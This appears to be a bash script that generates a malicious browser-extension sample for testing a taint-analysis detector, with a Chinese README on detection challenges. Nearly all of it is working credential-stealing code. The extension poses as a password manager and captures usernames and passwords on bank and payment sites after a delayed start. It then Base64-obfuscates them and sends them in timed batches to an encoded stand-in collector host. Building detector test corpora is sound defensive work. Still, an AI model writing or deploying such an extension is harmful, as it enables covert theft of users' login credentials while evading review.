#!/bin/bash
# Complete script to create all sample files for advanced_stealth_exfiltration

SAMPLE_DIR="samples/advanced_stealth_exfiltration"

echo "Creating advanced_stealth_exfiltration sample files..."

# Create manifest.json
cat > "$SAMPLE_DIR/manifest.json" << 'EOF'
{
  "manifest_version": 3,
  "name": "Advanced Password Manager",
  "version": "2.1.0",
  "description": "Secure password manager with encrypted cloud sync",
  "permissions": ["storage", "tabs", "cookies"],
  "host_permissions": ["https://*/*"],
  "background": {
    "service_worker": "background.js",
    "type": "module"
  },
  "content_scripts": [
    {
      "matches": ["https://*.bank.example/*", "https://*.payment.example/*"],
      "js": ["content.js"],
      "run_at": "document_end"
    }
  ]
}
EOF

# Create config.js
cat > "$SAMPLE_DIR/config.js" << 'EOF'
// config.js - Obfuscated configuration
// The server URL is Base64 encoded to evade simple pattern matching

// Encoded: "https://collector.evil-analytics.com/api/collect"
const ENCODED_SERVER = "aHR0cHM6Ly9jb2xsZWN0b3IuZXZpbC1hbmFseXRpY3MuY29tL2FwaS9jb2xsZWN0";

// Encoded: "report"
const ENCODED_ENDPOINT = "cmVwb3J0";

// Delay configuration (in milliseconds)
export const INITIAL_DELAY = 5 * 60 * 1000;  // 5 minutes
export const BATCH_DELAY = 2000;             // 2 seconds between batches
export const BATCH_SIZE = 3;                  // items per batch

// Decode server configuration
export function getServerConfig() {
  const base = atob(ENCODED_SERVER);
  const endpoint = atob(ENCODED_ENDPOINT);
  return {
    url: base,
    endpoint: endpoint
  };
}

// Target domains for credential harvesting
export const TARGET_DOMAINS = [
  "bank.example",
  "payment.example",
  "secure.example"
];

// Check if current URL matches target
export function isTargetDomain(url) {
  try {
    const hostname = new URL(url).hostname;
    return TARGET_DOMAINS.some(domain => hostname.includes(domain));
  } catch {
    return false;
  }
}
EOF

# Create utils.js
cat > "$SAMPLE_DIR/utils.js" << 'EOF'
// utils.js - Encoding and utility functions

// Encode sensitive data to Base64
export function encodeData(data) {
  try {
    const jsonStr = JSON.stringify(data);
    return btoa(jsonStr);
  } catch (e) {
    return btoa(String(data));
  }
}

// Split data into chunks for batched sending
export function chunkArray(array, size) {
  const chunks = [];
  for (let i = 0; i < array.length; i += size) {
    chunks.push(array.slice(i, i + size));
  }
  return chunks;
}

// Generate session ID for tracking
export function generateSessionId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// Obfuscate field names
export function obfuscateFields(obj) {
  return {
    u: obj.username || obj.email,      // u = username
    p: obj.password,                   // p = password
    d: obj.domain,                     // d = domain
    t: obj.timestamp,                  // t = timestamp
    s: obj.sessionId                   // s = sessionId
  };
}
EOF

# Create content.js
cat > "$SAMPLE_DIR/content.js" << 'EOF'
// content.js - Credential harvesting with delayed and conditional triggers
// Frame: CS_1 (matches: https://*.bank.example/*, https://*.payment.example/*)
//
// Flow patterns exercised:
//   1. ELEMENT_VALUE (password) → [delay] → [encode] → CHROME_LOCAL_STORAGE (STORAGE_POSOING)
//   2. ELEMENT_VALUE → CHROME_RUNTIME_SENDMESSAGE (trigger exfiltration)
//
// Attack techniques:
//   - Delayed activation (5 minutes after page load)
//   - Conditional triggering (only on target domains)
//   - Base64 encoding (obfuscation)

import { isTargetDomain, INITIAL_DELAY } from "./config.js";
import { encodeData, generateSessionId, obfuscateFields } from "./utils.js";

let isActivated = false;
let capturedCredentials = [];
const sessionId = generateSessionId();

// ─── Delayed Activation ────────────────────────────────────────────
// Wait 5 minutes before activating credential harvesting
function delayedActivation() {
  setTimeout(() => {
    isActivated = true;
    console.log("[PWD-MGR] Secure sync activated");
    startMonitoring();
  }, INITIAL_DELAY);
}

// ─── Conditional Monitoring ────────────────────────────────────────
function startMonitoring() {
  if (!isTargetDomain(window.location.href)) {
    return;
  }

  document.addEventListener("submit", handleFormSubmit, true);

  const passwordInputs = document.querySelectorAll('input[type="password"]');
  passwordInputs.forEach(input => {
    input.addEventListener("change", handlePasswordChange);
  });
}

// ─── Form Submit Handler ───────────────────────────────────────────
// SOURCE: ELEMENT_VALUE (username, password fields)
function handleFormSubmit(event) {
  if (!isActivated) return;

  const form = event.target;
  const username = form.querySelector('input[type="text"], input[type="email"]');
  const password = form.querySelector('input[type="password"]');

  if (username && password && password.value) {
    const credential = {
      username: username.value,           // SOURCE: ELEMENT_VALUE
      password: password.value,           // SOURCE: ELEMENT_VALUE
      domain: window.location.hostname,
      url: window.location.href,
      timestamp: Date.now(),
      sessionId: sessionId
    };

    capturedCredentials.push(credential);
    storeCredential(credential);
  }
}

// ─── Password Change Handler ───────────────────────────────────────
function handlePasswordChange(event) {
  if (!isActivated) return;

  const passwordField = event.target;
  const form = passwordField.closest("form");

  if (form && passwordField.value) {
    const usernameField = form.querySelector('input[type="text"], input[type="email"]');

    if (usernameField && usernameField.value) {
      const credential = {
        username: usernameField.value,    // SOURCE: ELEMENT_VALUE
        password: passwordField.value,    // SOURCE: ELEMENT_VALUE
        domain: window.location.hostname,
        url: window.location.href,
        timestamp: Date.now(),
        sessionId: sessionId,
        trigger: "autofill"
      };

      capturedCredentials.push(credential);
      storeCredential(credential);
    }
  }
}

// ─── Store Credential ──────────────────────────────────────────────
// SINK: CHROME_LOCAL_STORAGE
function storeCredential(credential) {
  const obfuscated = obfuscateFields(credential);
  const encoded = encodeData(obfuscated);

  chrome.storage.local.get(["harvested"], (result) => {
    const existing = result.harvested || [];
    existing.push(encoded);

    chrome.storage.local.set({ harvested: existing }, () => {    // SINK CHROME_LOCAL_STORAGE
      console.log("[PWD-MGR] Credential securely stored");

      chrome.runtime.sendMessage({
        type: "CREDENTIAL_CAPTURED",
        count: existing.length
      });
    });
  });
}

// ─── Initialize ────────────────────────────────────────────────────
delayedActivation();
EOF

# Create background.js
cat > "$SAMPLE_DIR/background.js" << 'EOF'
// background.js - Batched exfiltration with delayed scheduling
// Frame: BG_1
//
// Flow patterns exercised:
//   1. STORAGE_DATA (harvested credentials) → [decode] → [batch] → FETCH_RESOURCE (DATA_LEAK)
//   2. CHROME_RUNTIME_ONMESSAGE → trigger exfiltration
//
// Attack techniques:
//   - Batched sending (split into small chunks)
//   - Delayed transmission (random delays between batches)
//   - Dynamic server URL (decoded from Base64)

import { getServerConfig, BATCH_DELAY, BATCH_SIZE } from "./config.js";
import { chunkArray } from "./utils.js";

let exfiltrationInProgress = false;
let exfiltrationTimer = null;

// ─── Message Handler ───────────────────────────────────────────────
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "CREDENTIAL_CAPTURED") {
    console.log(`[BG] Credentials captured: ${message.count}`);

    if (!exfiltrationInProgress && !exfiltrationTimer) {
      scheduleExfiltration();
    }
  }

  return true;
});

// ─── Schedule Exfiltration ─────────────────────────────────────────
function scheduleExfiltration() {
  const delay = 30000 + Math.random() * 30000;

  exfiltrationTimer = setTimeout(() => {
    exfiltrationTimer = null;
    startBatchedExfiltration();
  }, delay);
}

// ─── Batched Exfiltration ──────────────────────────────────────────
async function startBatchedExfiltration() {
  if (exfiltrationInProgress) return;

  exfiltrationInProgress = true;

  try {
    // SOURCE: Read from chrome.storage.local
    const result = await chrome.storage.local.get(["harvested"]);
    const harvested = result.harvested || [];                    // SOURCE STORAGE_DATA

    if (harvested.length === 0) {
      exfiltrationInProgress = false;
      return;
    }

    console.log(`[BG] Exfiltrating ${harvested.length} credentials in batches`);

    const batches = chunkArray(harvested, BATCH_SIZE);

    for (let i = 0; i < batches.length; i++) {
      await sendBatch(batches[i], i);

      if (i < batches.length - 1) {
        await sleep(BATCH_DELAY);
      }
    }

    await chrome.storage.local.remove(["harvested"]);
    console.log("[BG] Exfiltration complete, storage cleared");

  } catch (error) {
    console.error("[BG] Exfiltration error:", error);
  } finally {
    exfiltrationInProgress = false;
  }
}

// ─── Send Single Batch ─────────────────────────────────────────────
// SINK: FETCH_RESOURCE
async function sendBatch(batch, batchIndex) {
  const config = getServerConfig();
  const url = `${config.url}/${config.endpoint}`;

  const payload = {
    batch: batchIndex,
    count: batch.length,
    data: batch,
    timestamp: Date.now(),
    version: "2.1.0"
  };

  try {
    const response = await fetch(url, {                          // SINK FETCH_RESOURCE
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Client-Version": "2.1.0"
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      console.log(`[BG] Batch ${batchIndex} sent successfully`);
    } else {
      console.error(`[BG] Batch ${batchIndex} failed:`, response.status);
    }
  } catch (error) {
    console.error(`[BG] Network error for batch ${batchIndex}:`, error);
  }
}

// ─── Utility: Sleep ────────────────────────────────────────────────
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ─── Periodic Check ────────────────────────────────────────────────
setInterval(() => {
  if (!exfiltrationInProgress && !exfiltrationTimer) {
    chrome.storage.local.get(["harvested"], (result) => {
      if (result.harvested && result.harvested.length > 0) {
        scheduleExfiltration();
      }
    });
  }
}, 10 * 60 * 1000);
EOF

# Create README.md
cat > "$SAMPLE_DIR/README.md" << 'EOF'
# Advanced Stealth Exfiltration Sample

## 攻击场景

模拟真实的密码窃取扩展，使用多种隐蔽技术来规避检测和分析。

## 攻击技术

1. **延时触发** - 页面加载后等待 5 分钟才激活
2. **条件触发** - 仅在特定域名触发
3. **Base64 编码** - 混淆服务器 URL 和数据
4. **分批传输** - 每批 3 条，间隔 2 秒
5. **动态配置** - 运行时解码服务器地址

## 预期检测流程

### 流程 1: ELEMENT_VALUE → CHROME_LOCAL_STORAGE (STORAGE_POSOING)
### 流程 2: STORAGE_DATA → FETCH_RESOURCE (DATA_LEAK)

## 运行测试

```bash
npm run build
node dist/main.js analyze --type DIR --input ./samples/advanced_stealth_exfiltration/ --out ./output/advanced_stealth_exfiltration/ --id aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

## 检测挑战

- setTimeout 回调的污点追踪
- Base64 编码/解码的污点保留
- 字符串拼接的污点传播
- 条件分支的覆盖率
- 跨上下文存储传播
EOF

echo "✅ Sample 1 (advanced_stealth_exfiltration) created successfully!"
echo ""
echo "Files created:"
ls -la "$SAMPLE_DIR"
